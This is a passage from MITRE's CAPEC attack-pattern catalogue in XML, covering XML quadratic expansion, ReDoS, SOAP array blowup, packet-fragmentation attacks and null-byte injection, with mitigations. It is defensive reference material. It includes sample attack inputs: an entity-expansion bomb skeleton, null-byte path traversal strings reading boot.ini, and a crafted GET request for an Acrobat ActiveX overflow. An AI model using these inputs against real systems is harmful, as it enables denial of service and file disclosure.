            <ns0:Mitigation>To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1498.002</ns0:Entry_ID>
               <ns0:Entry_Name>Network Denial of Service:Reflection Amplification</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="491" Name="Quadratic Data Expansion" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The result of this denial of service could cause the application to freeze or crash. This involves defining a very large entity and using it multiple times in a single entity substitution. CAPEC-197 is a similar attack pattern, but it is easier to discover and defend against. This attack pattern does not perform multi-level substitution and therefore does not obviously appear to consume extensive resources.</ns0:Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>XML Entity Expansion (XEE)</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="230" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using substituion on the victim's side.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process requests.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft malicious payload] The adversary crafts malicious message containing nested quadratic expansion that completely uses up available server resource.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Send the message] Send the malicious crafted message to the target URL.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of attack requires a server that accepts serialization data which supports substitution and parses the data.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In this example the attacker defines one large entity and refers to it many times.</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;?xml version="1.0"?&gt;<html:br />&lt;!DOCTYPE bomb [&lt;!ENTITY x "AAAAA<html:i>... [100K of them] ...</html:i>AAAA"&gt;]&gt;<html:br />&lt;b&gt;&lt;c&gt;&amp;x;&amp;x;<html:i>... [100K of them]...</html:i>&amp;x;&amp;x;&lt;/c&gt;&lt;/b&gt;</html:div>
               <html:p>This results in a relatively small message of 100KBs that will expand to a message in the GB range.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Mitigations, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2021-10-21">XML Quadratic Expansion</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="492" Name="Regular Expression Exponential Blowup" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>The algorithm builds a finite state machine and based on the input transitions through all the states until the end of the input is reached. NFA engines may evaluate each character in the input string multiple times during the backtracking. The algorithm tries each path through the NFA one by one until a match is found; the malicious input is crafted so every path is tried which results in a failure. Exploitation of the Regex results in programs hanging or taking a very long time to complete. These attacks may target various layers of the Internet due to regular expressions being used in validation.</html:p>
         </ns0:Extended_Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="400" />
            <ns0:Related_Weakness CWE_ID="1333" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Regular expression Denial of Service - ReDoS</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-421" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="493" Name="SOAP Array Blowup" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-422" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="494" Name="TCP Fragmentation" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules of network controls, by attempting to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>In comparison, IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. This behavior of fragmentation defeats some IPS and firewall filters who typically check the FLAGS in the header of the first packet since dropping this packet prevents the following fragments from being processed and assembled.</html:p>
            <html:p>Another variation is overlapping fragments thus that an innocuous first segment passes the filter and the second segment overwrites the TCP header data with the true payload which is malicious in nature. The malicious payload manipulated properly may lead to a DoS due to resource consumption or kernel crash. Additionally the fragmentation could be used in conjunction with sending fragments at a rate slightly slower than the timeout to cause a DoS condition by forcing resources that assemble the packet to wait an inordinate amount of time to complete the task. The fragmentation identification numbers could also be duplicated very easily as there are only 16 bits in IPv4 so only 65536 packets are needed.</html:p>
         </ns0:Extended_Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the target system to be running a vulnerable implementation of IP, and the adversary needs to ability to send TCP packets of arbitrary size with crafted data.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule "IF FO=1 and PROTOCOL=TCP then DROP PACKET" as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="404" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-423" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="495" Name="UDP Fragmentation" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="404" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-424" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="496" Name="ICMP Fragmentation" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>This attack may be mitigated through egress filtering based on ICMP payload so a network is a "good neighbor" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="404" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-425" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="52" Name="Embedding NULL Bytes" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and injects postfix null byte(s) to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.</ns0:Description>
               <ns0:Technique>Try different encodings for null such as \0 or %00</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) such that they remove data after the null byte(s) in a way that is beneficial to them.</ns0:Description>
               <ns0:Technique>If the input is a directory as part of a longer file path, add a null byte(s) at the end of the input to try to traverse to the given directory.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The program does not properly handle postfix NULL terminators</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Directory traversal</ns0:Skill>
            <ns0:Skill Level="High">Execution of arbitrary code</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Directory Browsing</html:p>
               <html:p>Assume a Web application allows a user to access a set of reports. The path to the reports directory may be something like web/username/reports. If the username is supplied via a hidden field, an adversary could insert a bogus username such as ../../../../../WINDOWS. If the adversary needs to remove the trailing string /reports, then they can simply insert enough characters so the string is truncated. Alternatively the adversary might apply the postfix NULL character (%00) to determine whether this terminates the string.</html:p>
               <html:p>Different forms of NULL to think about include</html:p>
               <html:div style="margin-left:1em;" class="informative">PATH%00<html:br />PATH[0x00]<html:br />PATH[alternate representation of NULL character]<html:br />&lt;script&gt;&lt;/script&gt;%00</html:div>
            </ns0:Example>
            <ns0:Example>
               <html:p>Exploitation of a buffer overflow vulnerability in the ActiveX component packaged with Adobe Systems Inc.'s Acrobat/Acrobat Reader allows remote adversaries to execute arbitrary code.</html:p>
               <html:p>The problem specifically exists upon retrieving a link of the following form:</html:p>
               <html:div style="margin-left:1em;" class="informative">GET /any_existing_dir/any_existing_pdf.pdf%00[long string] HTTP/1.1</html:div>
               <html:p>Where [long string] is a malicious crafted long string containing acceptable URI characters. The request must be made to a web server that truncates the request at the null byte (%00), otherwise an invalid file name is specified and a "file not found" page will be returned. Example web servers that truncate the requested URI include Microsoft IIS and Netscape Enterprise. Though the requested URI is truncated for the purposes of locating the file the long string is still passed to the Adobe ActiveX component responsible for rendering the page. This in turn triggers a buffer overflow within RTLHeapFree() allowing for an adversary to overwrite an arbitrary word in memory. The responsible instructions from RTLHeapFree() are shown here:</html:p>
               <html:div style="margin-left:1em;" class="informative">0x77F83AE5 MOV EAX,[EDI+8]<html:br />0x77F83AE8 MOV ECX,[EDI+C]<html:br />...<html:br />0x77F83AED MOV [ECX],EAX</html:div>
               <html:p>The register EDI contains a pointer to a user-supplied string. The adversary therefore has control over both the ECX and EAX registers used in the shown MOV instruction.</html:p>
               <html:p>Successful exploitation allows remote adversaries to utilize the arbitrary word overwrite to redirect the flow of control and eventually take control of the affected system. Code execution will occur under the context of the user that instantiated the vulnerable version of Adobe Acrobat.</html:p>
               <html:p>An adversary does not need to establish a malicious web site as exploitation can occur by adding malicious content to the end of any embedded link and referencing any Microsoft IIS or Netscape Enterprise web server. Clicking on a direct malicious link is also not required as it may be embedded within an IMAGE tag, an IFRAME or an auto-loading script.</html:p>
               <html:p>Successful exploitation requires that a payload be written such that certain areas of the input are URI acceptable. This includes initial injected instructions as well as certain overwritten addresses. This increases the complexity of successful exploitation. While not trivial, exploitation is definitely plausible [REF-445].</html:p>See also: CVE-2004-0629</ns0:Example>
            <ns0:Example>
               <html:p>Consider the following PHP script:</html:p>
               <html:div style="margin-left:1em;" class="informative">$whatever = addslashes($_REQUEST['whatever']);<html:br />include("/path/to/program/" . $whatever . "/header.htm");</html:div>
               <html:p>A malicious adversary might open the following URL, disclosing the boot.ini file:</html:p>
               <html:div style="margin-left:1em;" class="informative">http://localhost/phpscript.php?whatever=../../../../boot.ini%00</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="158" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>28</ns0:Entry_ID>
               <ns0:Entry_Name>Null Byte Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Embedding Null Code</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-445" />
            <ns0:Reference External_Reference_ID="REF-446" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
